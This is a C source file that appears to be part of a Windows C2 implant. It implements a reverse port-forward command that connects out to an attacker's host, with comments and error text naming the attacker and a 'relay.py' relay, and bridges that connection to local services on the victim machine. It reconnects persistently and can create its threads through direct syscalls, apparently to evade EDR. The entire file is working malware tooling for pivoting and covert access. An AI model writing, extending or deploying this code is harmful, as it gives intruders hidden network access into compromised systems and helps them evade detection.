#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#ifdef INCLUDE_CMD_RPORTFWD

#define RPF_MAX 8

typedef struct {
    int    active;
    int    local_port;
    SOCKET sock_a;   /* vers attaquant */
    SOCKET sock_b;   /* vers service local */
} RpfSlot;

static RpfSlot          g_rpf[RPF_MAX];
static CRITICAL_SECTION g_rpf_cs;
static int              g_rpf_ok = 0;

static void rpf_ensure_init(void) {
    if (g_rpf_ok) return;
    InitializeCriticalSection(&g_rpf_cs);
    for (int i = 0; i < RPF_MAX; i++) {
        g_rpf[i].active = 0;
        g_rpf[i].sock_a = INVALID_SOCKET;
        g_rpf[i].sock_b = INVALID_SOCKET;
    }
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    g_rpf_ok = 1;
}

static SOCKET rpf_connect(const char *host, int port, int timeout_ms) {
    struct addrinfo hints = {0}, *res = NULL;
    char port_s[8];
    snprintf(port_s, sizeof(port_s), "%d", port);
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port_s, &hints, &res) != 0) return INVALID_SOCKET;

    SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return INVALID_SOCKET; }

    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    connect(s, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);

    fd_set wfds, efds;
    FD_ZERO(&wfds); FD_SET(s, &wfds);
    FD_ZERO(&efds); FD_SET(s, &efds);
    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    if (select(0, NULL, &wfds, &efds, &tv) <= 0 || FD_ISSET(s, &efds)) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    nb = 0;
    ioctlsocket(s, FIONBIO, &nb);
    return s;
}

static int rpf_json_int(const char *json, const char *key, int def) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return def;
    p = strchr(p, ':');
    if (!p) return def;
    while (*++p == ' ');
    return (*p >= '0' && *p <= '9') ? atoi(p) : def;
}

typedef struct {
    int  idx;
    char local_host[256];
    int  local_port;
    char remote_host[256];
    int  remote_port;
} SessionCtx;

static void do_relay(SOCKET a, SOCKET b) {
    char buf[8192];
    while (1) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(a, &rfds);
        FD_SET(b, &rfds);
        struct timeval tv = { 0, 200000 };
        int n = select(0, &rfds, NULL, NULL, &tv);
        if (n == SOCKET_ERROR) break;
        if (n == 0) continue;
        if (FD_ISSET(a, &rfds)) {
            int r = recv(a, buf, sizeof(buf), 0);
            if (r <= 0) break;
            if (send(b, buf, r, 0) == SOCKET_ERROR) break;
        }
        if (FD_ISSET(b, &rfds)) {
            int r = recv(b, buf, sizeof(buf), 0);
            if (r <= 0) break;
            if (send(a, buf, r, 0) == SOCKET_ERROR) break;
        }
    }
    closesocket(a);
    closesocket(b);
}

static DWORD WINAPI session_thread(LPVOID arg) {
    SessionCtx *ctx = (SessionCtx *)arg;
    int idx = ctx->idx;

    while (1) {
        /* Check if stop was requested */
        EnterCriticalSection(&g_rpf_cs);
        int still_active = g_rpf[idx].active;
        LeaveCriticalSection(&g_rpf_cs);
        if (!still_active) break;

        SOCKET sa = rpf_connect(ctx->remote_host, ctx->remote_port, 5000);
        if (sa == INVALID_SOCKET) { Sleep(2000); continue; }

        SOCKET sb = rpf_connect(ctx->local_host, ctx->local_port, 5000);
        if (sb == INVALID_SOCKET) { closesocket(sa); Sleep(2000); continue; }

        EnterCriticalSection(&g_rpf_cs);
        g_rpf[idx].sock_a = sa;
        g_rpf[idx].sock_b = sb;
        LeaveCriticalSection(&g_rpf_cs);

        do_relay(sa, sb);   /* blocking until disconnection */

        EnterCriticalSection(&g_rpf_cs);
        g_rpf[idx].sock_a = INVALID_SOCKET;
        g_rpf[idx].sock_b = INVALID_SOCKET;
        LeaveCriticalSection(&g_rpf_cs);

        Sleep(500); /* petite pause avant reconnexion */
    }

    EnterCriticalSection(&g_rpf_cs);
    g_rpf[idx].active = 0;
    LeaveCriticalSection(&g_rpf_cs);
    free(ctx);
    return 0;
}

void command_rportfwd(char *task_id, char *params) {
    rpf_ensure_init();

    char action[16]       = "start";
    char local_host[256]  = "127.0.0.1";
    int  local_port       = 0;
    char remote_host[256] = {0};
    int  remote_port      = 0;

    extract_json_string(params, "action",      action,      sizeof(action));
    extract_json_string(params, "local_host",  local_host,  sizeof(local_host));
    extract_json_string(params, "remote_host", remote_host, sizeof(remote_host));
    local_port  = rpf_json_int(params, "local_port",  0);
    remote_port = rpf_json_int(params, "remote_port", 0);

    /* --- STOP --- */
    if (strcmp(action, "stop") == 0) {
        EnterCriticalSection(&g_rpf_cs);
        int found = 0;
        for (int i = 0; i < RPF_MAX; i++) {
            if (g_rpf[i].active && g_rpf[i].local_port == local_port) {
                closesocket(g_rpf[i].sock_a);
                closesocket(g_rpf[i].sock_b);
                g_rpf[i].active = 0;
                found = 1;
                break;
            }
        }
        LeaveCriticalSection(&g_rpf_cs);
        char msg[64];
        snprintf(msg, sizeof(msg),
                 found ? "Forward :%d stopped." : "No active forward on :%d.",
                 local_port);
        send_task_response(task_id, msg);
        return;
    }

    /* --- START --- */
    if (local_port <= 0 || remote_port <= 0 || remote_host[0] == '\0') {
        send_task_response(task_id, "Error: local_port, remote_host and remote_port are required");
        return;
    }

    EnterCriticalSection(&g_rpf_cs);
    int idx = -1;
    for (int i = 0; i < RPF_MAX; i++)
        if (!g_rpf[i].active) { idx = i; break; }
    LeaveCriticalSection(&g_rpf_cs);

    if (idx < 0) {
        send_task_response(task_id, "Error: max 8 concurrent port forwards reached");
        return;
    }

    /* Initial connectivity test */
    SOCKET sa = rpf_connect(remote_host, remote_port, 5000);
    if (sa == INVALID_SOCKET) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Error: cannot reach attacker %s:%d (relay.py running?)",
                 remote_host, remote_port);
        send_task_response(task_id, msg);
        return;
    }
    SOCKET sb = rpf_connect(local_host, local_port, 5000);
    if (sb == INVALID_SOCKET) {
        closesocket(sa);
        char msg[256];
        snprintf(msg, sizeof(msg), "Error: cannot reach local service %s:%d",
                 local_host, local_port);
        send_task_response(task_id, msg);
        return;
    }
    closesocket(sa);
    closesocket(sb);

    EnterCriticalSection(&g_rpf_cs);
    g_rpf[idx].active     = 1;
    g_rpf[idx].local_port = local_port;
    g_rpf[idx].sock_a     = INVALID_SOCKET;
    g_rpf[idx].sock_b     = INVALID_SOCKET;
    LeaveCriticalSection(&g_rpf_cs);

    SessionCtx *ctx = (SessionCtx *)malloc(sizeof(SessionCtx));
    ctx->idx = idx;
    strncpy(ctx->local_host,  local_host,  sizeof(ctx->local_host)  - 1);
    strncpy(ctx->remote_host, remote_host, sizeof(ctx->remote_host) - 1);
    ctx->local_port  = local_port;
    ctx->remote_port = remote_port;

    HANDLE t = NULL;
#ifdef EVASION_SYSCALLS
    kratos_NtCreateThreadEx(&t, THREAD_ALL_ACCESS, NULL,
                             GetCurrentProcess(), (PVOID)session_thread, ctx,
                             0, 0, 0, 0, NULL);
#else
    t = CreateThread(NULL, 0, session_thread, ctx, 0, NULL);
#endif
    if (!t) {
        free(ctx);
        g_rpf[idx].active = 0;
        send_task_response(task_id, "Error: CreateThread failed");
        return;
    }
    CloseHandle(t);

    char msg[512];
    snprintf(msg, sizeof(msg),
             "Port forward active: %s:%d <-> %s:%d",
             local_host, local_port, remote_host, remote_port);
    send_task_response(task_id, msg);
}

#endif
